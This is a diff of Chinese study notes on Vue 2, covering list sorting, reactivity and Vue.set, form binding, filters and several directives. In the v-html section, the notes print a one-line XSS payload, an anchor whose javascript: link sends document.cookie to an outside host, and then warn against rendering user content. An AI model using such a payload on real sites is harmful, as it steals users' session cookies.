@@ -169,7 +169,7 @@ var app = new Vue({
 
 输出结果：`Hello Vue!`
 
-### 2. ==指令语法==
+### 2. ==常见的指令语法==
 
 > Vue里的指令都是以`V-`开头，如：**`v-bind`指令会将标签属性值作为JavaScript表达式执行**，就会被转译成JavaScript表达式执行。
 >
@@ -216,7 +216,7 @@ var app = new Vue({
   |     v-for     |           基于数据渲染一个列表，类似于JS中的遍历。           |         |
   |    v-bind     |                           属性绑定                           |    :    |
   |     v-on:     |      给标签绑定函数常用的事件有：click、keyup、keydown       |    @    |
-  |    v-text     |                           解析文本                           |         |
+  |    v-text     |                    向所在的标签中插入文本                    |         |
 
 ### 3. 插值语法与指令语法具体使用情况
 
@@ -1679,9 +1679,644 @@ vm.$watch("isHot", function(){
 
   > 使用计算属性较为简单，我们只需要关注`keyWord`变量，也就是只用关注用户的输入字符即可。
 
-### 4. 列表升序案例
+### 4. 列表排序案例
 
-> 
+> 我们在上个案例中实现了模糊搜索数据的操作，这里我们再添加一个实现搜索后排序的功能。排序有升序、降序和原顺序。
 
+~~~html
+<body>
+    <div id= "root">
+        <h2>人员列表</h2>
+        <input type="text" placeholder="请输入名字" v-model="keyWord"/>
+        <button @click="sortType=2">年龄升序</button>
+        <button @click="sortType=1">年龄降序</button>
+        <button @click="sortType=0">原顺序</button>
+        <ul>
+            <li v-for="(p,index) of filPerons" :key= "p.id">
+                {{p.name}}-{{p.age}}-{{p.sex}}
+            </li>
+        </ul>
+    </div>
+</body>
+<script>
+    new Vue({
+        el:'#root',
+        data:{
+            keyWord:'',
+            sortType:0, //0代表原顺序 1降序 2升序
+            persons:[
+                {id:'001',name:'马冬梅',age:19,sex:'女'},
+                {id:'002',name:'周冬雨',age:20,sex:'女'},
+                {id:'003',name:'周杰伦',age:21,sex:'男'},
+                {id:'004',name:'温兆伦',age:22, sex:'男'}
+            ]
+        },
+        computed:{
+            filPerons(){
+                const arr=this.persons.filter((p)=>{
+                    return p.name.indexOf(this.keyWord) !== -1
+                })
+                if(this.sortType){
+                    arr.sort((p1,p2)=>{
+                        return this. sortType === 1 ? p2.age-p1.age : p1.age-p2.age
+                    })
+                }
+                return arr
+            }
+        }
+    })
+</script>
+~~~
 
+> 这个案例中我们只需要创建一个标记变量`sortType`用来判断变量值是否需要排序。再根据需求进行排序即可。
 
+### 5. Vue检测数据的原理
+
+> - 在对象中检测原理：
+>
+>   在Vue的设计中对对象的数据进行了一个递归，查找对象中的每一个属性，并且对其进行数据代理，给每一个属性设有`get`和`set`方法，这样子当对象中的数据发生改变，那么Vue就会察觉并修改页面中的数据
+>
+> - 在数组中检测原理：
+>
+>   通过包裹数组更新元素的方式实现，本质就是做了两件事：
+>
+>   1. 调整原生对应的方法对数组进行更新
+>   2. 重新解构模型，进而更新页面
+>
+> 在修改数组的时候，我们只有通过数组的修改方法才能达到页面响应的效果。这是因为Vue将能改变原数组的的方法进行了包装，所以当我们调用这些方法才可以进行试图更新。修改方法有`push`、`pop`、`shift`、`unshift`、`splice`、`sort`、`reverse`。
+>
+> **在修改对象或者数组的时候，我们也可以用Vue给我们提供的`set`API来进行添加数据。**
+
+**注意：Vue.set()和vm.set() 不能给vm或者vm的根数据对象添加属性(如：data、vm)**
+
+#### 5.1 Vue的无法监听对象的情况
+
+- 问题引入：
+
+  ~~~html
+  <body>
+      <div id="root">            
+          <button @click="updata">更新周冬雨的信息</button>
+          <ul>
+              <li v-for="p in persons" :key="p.id">
+                  {{p.name}}---{{p.age}}
+              </li>
+          </ul>
+      </div>
+  </body>
+  <script>
+      var vm = new Vue({
+          el:"#root",
+          data:{
+              persons:[
+                  {id:"001", name:"周冬雨", age:19},
+                  {id:"002", name:"周杰伦", age:30},
+                  {id:"003", name:"夏雨", age:2},
+                  {id:"004", name:"温兆伦", age:22}
+              ]
+          },
+          methods: {
+              updata(){
+                  this.persons[0].name = "周老师"
+                  this.persons[0].age = 40
+              }
+          }
+      })
+  </script>
+  ~~~
+
+  以上方法使用给数组属性赋值的方式可以实现页面数据变化。当我们点击页面按钮后显示数据就会改为下面的：
+
+  [Vue监视页面原理：](https://s1.ax1x.com/2022/04/28/LXm9DU.png)
+
+  ​																	[<img src="https://s1.ax1x.com/2022/04/28/LXm9DU.png" alt="LXm9DU.png" style="zoom:50%;" />](https://imgtu.com/i/LXm9DU)
+
+- 但如下代码却不能完成修改页面数据的操作。
+
+  ~~~html
+  <body>
+      <div id="root">            
+          <button @click="updata">更新周冬雨的信息</button>
+          <ul>
+              <li v-for="p in persons" :key="p.id">
+                  {{p.name}}---{{p.age}}
+              </li>
+          </ul>
+      </div>
+  </body>
+  <script>
+      var vm = new Vue({
+          el:"#root",
+          data:{
+              persons:[
+                  {id:"001", name:"周冬雨", age:19},
+                  {id:"002", name:"周杰伦", age:30},
+                  {id:"003", name:"夏雨", age:2},
+                  {id:"004", name:"温兆伦", age:22}
+              ]
+          },
+          methods: {
+              updata(){
+                 	this.persons[0] = {id:"001", name:"周老师", age:40}
+              }
+          }
+      })
+  </script>
+  ~~~
+
+  分批对一个对象的属性进行修改，这样产生的效果是对的，**但是我们修改一整条数据（对象），并没有产生我们预想中的效果**，但此时我们打开控制台去看到数据已经修改：
+
+  [Vue监测数据控制台改变：](https://s1.ax1x.com/2022/04/28/LXmjde.png)
+
+  ​                                        [<img src="https://s1.ax1x.com/2022/04/28/LXmjde.png" alt="LXmjde.png" style="zoom:50%;" />](https://imgtu.com/i/LXmjde)
+
+  我们可以用如下方法进行修改：
+
+  ~~~JavaScript
+  this.persons.splice(0,1,{name:'周老师',age:50})
+  ~~~
+
+  这时我们再点击按钮就可以达到修改第一行数据的效果。
+
+#### 5.2 Vue的两个setAPI
+
+> 由于上面的赋值属性导致Vue无法做到监听页面的效果，这是由于属性的没有`setter`方法导致的，所以我们在给页面追加属性的时候可以使用Vue的两个API来达到给页面添加元素的同时追加`getter`和`setter`方法。该方法可以向响应式对象中添加一个属性。
+
+~~~html
+<body>
+    <button @click="addSex">添加一个性别属性，默认值是男</button> 
+    <h2> v-if="student.sex">性别：{{student.sex}}</h2> 
+</body>
+<script>
+    const Vm = new Vue({
+        el: '#root',
+        data:{
+            name:'shi',
+            address:'北京',
+            student:{
+                name:'Tom',
+                age:{
+                    rAge:40,
+                    sAge :29,
+                },
+                friends:[
+                    {name:'jerry',age:35},
+                    {name:'tony',age:36}
+                ]
+            }
+        },
+        methods: {
+            addSex(){
+                Vue.set(this.student,'sex','男')
+            }
+        }
+    })
+</script>
+~~~
+
+> 上面的`Vue.set(this.student,'sex','男')`代码用于在点击按钮后往页面添加一个性别的属性。如果不适用set方法，则Vue就无法做到页面监听，从而页面就不会有该项属性。
+>
+> 这里也可以写为：`Vue.$set(this.student,'sex','男')`
+>
+> 注意：set不能给Vue的data实例追加属性，只能给data内的对象或者数组追加。
+
+## 十. 收集表单数据
+
+> 我们之前的`v-model`指令可以做到收集用户输出框内信息的效果。但却不能收集用户选框内的数据。如下：
+
+[from中选框收集不到数据：](https://s1.ax1x.com/2022/04/29/LvqDSA.png)
+
+​													[<img src="https://s1.ax1x.com/2022/04/29/LvqDSA.png" alt="LvqDSA.png" style="zoom:50%;" />](https://imgtu.com/i/LvqDSA)
+
+上图所示我们勾选了性别为女，但Vue示例绑定属性却显示为`null`。所以数据收集失败。解决办法就是给每个选框设置`value`值。勾选时，获取`value`值数据即可。
+
+### 1. 收集用户信息完整代码：
+
+~~~html
+<!DOCTYPE html>
+<html>
+    <head>
+        <meta charset="utf-8"/>
+        <title>收集表单数据</title>
+        <script type="text/javascript" src="../js/vue.js"></script>
+    </head>
+    <body>
+        <div id="root">
+            <form @submit.prevent="demo1">
+                <label for="demo">账号：</label>
+                <input type="text" id="demo" v-model.trim="userInfo.account"><br/><br/>
+                密码： <input type="password" v-model="userInfo.password"><br/><br/>
+                年龄： <input type="number" v-model.number="userInfo.age"><br/><br/>
+                性别：
+                男<input type="radio" name="sex" value="male" v-model="userInfo.sex">
+                女<input type="radio" name="sex" value="female" v-model="userInfo.sex"><br/><br/>
+                爱好：
+                学习<input type="checkbox" v-model="userInfo.hobby" value="study">
+                打游戏<input type="checkbox" v-model="userInfo.hobby" value="game">
+                听音乐<input type="checkbox" v-model="userInfo.hobby" value="music"><br/><br/>
+                所属校区:
+                <select v-model="userInfo.city">
+                    <option value="">请选择校区</option>
+                    <option value="beijing">北京</option>
+                    <option value="shanghai">上海</option>
+                    <option value="shenzhen">深圳</option>
+                    <option value="guangzhou">广州</option>
+                </select><br/><br/>
+                其他信息：
+                <textarea v-model.lazy="userInfo.other"></textarea><br/><br/>
+                <input type="checkbox" v-model="userInfo.agree">阅读并接受 <a href="https://www.hnu.edu.cn/">《用户协议》</a><br/><br/>
+                <button>提交</button>
+            </form>
+        </div>
+    </body>
+
+    <script type="text/javascript">
+        Vue.config.productionTip = false
+
+        const vm = new Vue({
+            el:'#root',
+            data:{
+                userInfo:{
+                    account:'',
+                    password:'',
+                    age:'',
+                    sex:'',
+                    hobby:[],
+                    city:'',
+                    other:'',
+                    agree:'',
+                },
+            },
+            //以JSON格式输出用户填写的信息。
+            methods: {
+                demo1(){
+                    console.log(JSON.stringify(this.userInfo))
+                }
+            }
+        })
+    </script>
+</html>
+~~~
+
+[表单数据收集成功：](https://s1.ax1x.com/2022/04/29/LvvkDI.png)										[<img src="https://s1.ax1x.com/2022/04/29/LvvkDI.png" alt="LvvkDI.png" style="zoom: 50%;" />](https://imgtu.com/i/LvvkDI)
+
+### 2. v-model修饰符
+
+|     修饰符     |                             描述                             |
+| :------------: | :----------------------------------------------------------: |
+|  v-model.lazy  | 使用lazy修饰符来进行限定。只有当用户的input中失去焦点或者用户点击回车按钮时，才会将后台的数据进行修改。 |
+| v-model.number | 当用户在input中输入数字时，浏览器会默认将输入的数字转化为string类型，使用number修饰符来将输入的数字转为number类型。一般配合`input`中的`type='number'`使用 |
+|  v-model.trim  | 用户可能输入的字符串中含有空格，这样系统在处理时可能会出现错误。使用trim修饰符来去掉字符串首部或者尾部的所有空格。 |
+
+### 3. 总结
+
+收集表单数据:
+若：` <input type="text"/>`, 则v -model收集的是value值，用户输入的就是value值。
+若： `<input type="radio"/>`, 则v-model收集的是value值，且要给标签配置value值。
+若： `<input type="checkbox"/>`
+
+1. 没有配置input的value属性，那么收集的就是checked(勾选or未勾选，是布尔值)
+2. 配置input的value属性:
+   - v-mode1的初始值是非数组，那么收集的就是checked (勾选or未勾选，是布尔值)
+   - v-mode1的初始值是数组，那么收集的的就是value组成的数组
+
+## 十一. 过滤器
+
+> 功能：对要显示的数据进行特定格式化后再显示
+> 注意：并没有改变原本的数据,是产生新的对应的数据。
+
+### 1. 过滤器使用位置
+
+> 过滤器可以用在两个地方：**双花括号插值和 `v-bind` 表达式** (后者从 2.1.0+ 开始支持)，用字符串`|`标识从这里开始是一个过滤器
+
+~~~html
+<!--在双花括号中-->
+{{ rawId | filterformatId }}
+
+<!--在v-bind中。v-bind可省略，以简写--> 
+<div v-bind:id="rawId | filter formatId"></div> 
+~~~
+
+完整写法：
+
+~~~html
+<template>
+    <div class="test">
+        <div :id="rawId">{{rawId}}</div>
+        <!--以下v-bind可省略，即v-bind:id可简写为:id -->
+        <div v-bind:id="rawId |filter formatId">{{rawId | filter formatId}}</div>
+    </div>
+    </ template>
+<script>
+    export default {
+        data() {
+            return {
+                rawId: 1
+            };
+        },
+        filters: {
+            filterformatId(value) {
+                return value * 10; 
+            }
+        }
+    };
+</script>
+~~~
+
+[运行结果：](https://s1.ax1x.com/2022/04/29/Lxigv8.png)
+
+​												[<img src="https://s1.ax1x.com/2022/04/29/Lxigv8.png" alt="Lxigv8.png" style="zoom: 50%;" />](https://imgtu.com/i/Lxigv8)
+
+### 2. 全局过滤器、局部过滤器
+
+- 全局过滤器，要用到`filter`方法，该方法接收两个参数：第一个参数是方法名，第二个参数是具体方法
+
+  ~~~JavaScript
+  Vue.filter('filteraddPricePrefix', function (value) {
+    return "¥" + value;
+  })
+  ~~~
+
+- 局部过滤器，我们正常再Vue实例中编写的filters叫局部方法，也叫局部过滤器
+
+  ~~~html
+  <template>
+      <div class="test">
+          <p>{{price}}</p>
+          <p>{{price | filter_addPricePrefix}}</p>
+      </div>
+  </template>
+  
+  <script>
+      export default {
+          data() {
+              return {
+                  price: 100
+              };
+          },
+          filters: {
+              filter_addPricePrefix(value) {
+                  return "¥" + value;
+              }
+          }
+      };
+  </script>
+  
+  <style lang="scss" scoped>
+      .test {
+          color: black;
+      }
+  </style>
+  ~~~
+
+### 3，过滤器中的参数
+
+> 以下代码中，`filterA` 被定义为接收三个参数的过滤器函数。其中 `message` 的值作为第一个参数，普通字符串 `'arg1'` 作为第二个参数，表达式 `arg2` 的值作为第三个参数。
+
+~~~javascript
+{{ message | filterA('arg1', arg2) }}
+~~~
+
+实例：
+
+~~~html
+<template>
+    <div class="test">
+        <!-- 要过滤的数据，永远是第一个参数；通过filter函数，传递的参数，依次排在后面。 -->
+        <p>{{ new Date() | filter_dateFormat }}</p>
+        <p>{{ new Date() | filter_dateFormat('YYYY-MM-DD') }}</p>
+        <p>{{ new Date() | filter_dateFormat('YYYY-MM-DD', count) }}</p>
+    </div>
+</template>
+<script src="https://cdn.bootcss.com/moment.js/2.24.0/moment.js"></script>
+<script>
+    export default {
+        data() {
+            return {
+                count: 10
+            };
+        },
+        filters: {
+            filter_dateFormat(date, format, count) {
+                return (
+                    moment(date).format(format || "YYYY-MM-DD HH:mm:ss") +(count ? " -- " + count : "")
+                );
+            }
+        }
+    };
+</script>
+~~~
+
+[运行结果：](https://s1.ax1x.com/2022/04/29/LxkSeg.png)
+
+​																			[![LxkSeg.png](https://s1.ax1x.com/2022/04/29/LxkSeg.png)](https://imgtu.com/i/LxkSeg)
+
+### 4. 多个过滤器串联
+
+> 如下代码：`filterA` 被定义为接收单个参数的过滤器函数，表达式 `message` 的值将作为参数传入到函数中。然后继续调用同样被定义为接收单个参数的过滤器函数 `filterB`，将 `filterA` 的结果传递到 `filterB` 中。
+
+~~~JavaScript
+{{ message | filterA | filterB }}
+~~~
+
+完整示例：
+
+~~~html
+<template>
+    <div class="test">
+        <p>{{price}}</p>
+        <p>{{price | filter_addPricePrefix}}</p>
+        <p>{{price | filter_addPricePrefix |filter_addPriceSuffix}}</p>
+    </div>
+</template>
+
+<script>
+    export default {
+        data() {
+            return {
+                price: 100
+            };
+        },
+        filters: {
+            filter_addPricePrefix(value) {
+                return "¥" + value;
+            },
+            filter_addPriceSuffix(value) {
+                return value + "元";
+            }
+        }
+    };
+</script>
+
+<style lang="scss" scoped>
+    .test {
+        color: black;
+    }
+</style>
+~~~
+
+[运行结果：](https://s1.ax1x.com/2022/04/29/LxkUTH.png)
+
+​																			[![LxkUTH.png](https://s1.ax1x.com/2022/04/29/LxkUTH.png)](https://imgtu.com/i/LxkUTH)
+
+### 5. 总结
+
+过滤器：
+定义：对要显示的数据进行特定格式化后再显示(适用于一些简单逻辑的处理)。
+语法:
+
+1. 注册过滤器: Vue . filter(name, callback)或new Vue{filters;{}}
+2. 使用过滤器: {{ xxx|过滤器名}} 或v-bind:属性 ='xxx|过滤器名”
+
+备注:
+
+1. 过滤器也可以接收额外参数、多个过滤器也可以串联
+2. 并没有改变原本的数据，是产生新的对应的数据
+
+## 十二. 其他Vue指令介绍
+
+> 经过之前的学习我们已经学习了Vue的大部分指令，这里在对几个较为常用的指令进行介绍
+
+### 1. v-text指令
+
+> 向所在的标签中插入文本，其与插值语法的区别在于，该指令会直接替换容器中的内容。
+
+~~~html
+<body>
+    <div>你好，{{name}}</div>
+    <div v-text="name">你好</div>
+</body>
+<script>
+    Vue.config.productionTip = false //阻止vue在启动时生成生产提示。
+    new Vue({
+        el: '#root',
+        data:{
+            name:'shi'
+        }
+    })
+</script>
+~~~
+
+运行结果：`你好，shi`，`shi`
+
+- 总结：
+
+  作用：向其所在的节点中渲染文本内容。
+  与插值语法的区别： v-text会 替换掉节点中的内容，{{xx}}则不会。
+
+### 2. v-html指令
+
+> 与v-text的功能一致，但`v-html`可以进行结构解析。即可以将定义的字符标签转换为HTML。
+
+~~~html
+<body>
+    <!--准备好一个容器--> 
+    <div id="root">
+        <div v-html= "str"></div>
+    </div>
+</body>
+<script type= "text/javascript" >
+    Vue.config.productionTip = false //阻止vue在启动时生成生产提示。
+    new Vue({
+        el:'#root'，
+        data:{
+        name: 'shi',
+        str:'<p>你好啊! </p>'
+</script>
+~~~
+
+运行后页面输出：**`你好啊！`**
+
+~~~html
+<a href=javascript:location.href= "http:/ /www. baidu . com?"+document.cookie></a>
+~~~
+
+- 总结
+
+  v-htm1指令：
+
+  1. 作用:向指定节点中渲染包含html1结构的内容。
+  2. 与插值语法的区别:
+     - v-html会替换掉节点中所有的内容，{{xx}}则不会。
+     - v-htm1可以识别htm1结构。
+  3. 严重注意: v-htm1有 安全性问题! ! ! !
+     - 在网站上动态渲染任意HTML是非常危险的，容易导致XSS攻击。
+     - 一定要在可信的内容上使用v-html，永不要用在用户提交的内容上!
+
+### 3. v-cloak指令
+
+> v-cloak指令常常用在插值表达式的标签中，因为它可以解决当网络加载很慢时，或者频繁渲染时候，页面就会显示出源代码的情况。
+>
+> v-cloak原理是先通过样式隐藏内容，然后在内存中进行值的替换，将替换的内容再反馈给界面，数据渲染完场之后，v-cloak 属性会被自动去除。
+
+~~~html
+<style type="text/css">
+    [v-cloak]{
+        display: none;
+    }
+</style>
+<h3 v-cloak>{{name}}</h3>
+~~~
+
+以上代码会在服务器加载完毕后在将v-cloak移除，达到显示标签的效果。
+
+v-cloak指令(没有值) :
+
+1. 本质是一个特殊属性，Vue实 例创建完毕并接管容器后，会删掉v-cloak属性。
+2. 使用css配合v-cloak可以解决网速慢时页面展示出{ {x}}的问题。
+
+### 4. v-once指令
+
+> v-once指令: 
+>
+> 1. v-once所在节点在初次动态渲染后，就视为静态内容了。
+> 2. 以后数据的改变不会引起v-once所在结构的更新，可以用于优化性能。
+
+~~~html
+<body>
+    <div id="root">
+        <h2 v-once>初始化的n值是:{{n}</h2>
+        <h2>当前的n值是:{{n}}</h2>
+        <button @click= "n++">点我n+1</button>
+    </div>
+</body>
+<script>
+    Vue.config.productionTip = false //阻止vue在启动时生成生产提示。
+    new Vue({
+        el: '#root',
+        data:{
+            n:1
+        }
+    })
+</script>
+~~~
+
+以上代码执行之后，第一个`<h2>`标签只会读取一次n的值，后来n++不会对绑定`v-once`指令的标签造成影响。
+
+### 5. v-pre指令
+
+> v-pre指令:
+>
+> 1. 跳过其所在节点的编译过程。
+> 2. 可利用它跳过:没有使用指令语法、没有使用插值语法的节点，会加快编译。
+
+~~~html
+<body>
+    <div id="root">
+        <h2 v-pre>初始化的n值是:{{n}</h2>
+        <h2 v-pre>当前的n值是:{{n}}</h2>
+        <button @click= "n++">点我n+1</button>
+    </div>
+</body>
+<script>
+    Vue.config.productionTip = false //阻止vue在启动时生成生产提示。
+    new Vue({
+        el: '#root',
+        data:{
+            n:1
+        }
+    })
+</script>
+~~~
+
+运行结果：`初始化的n值是:{{n}`、`当前的n值是:{{n}}`页面不会进行编译，而是直接渲染。
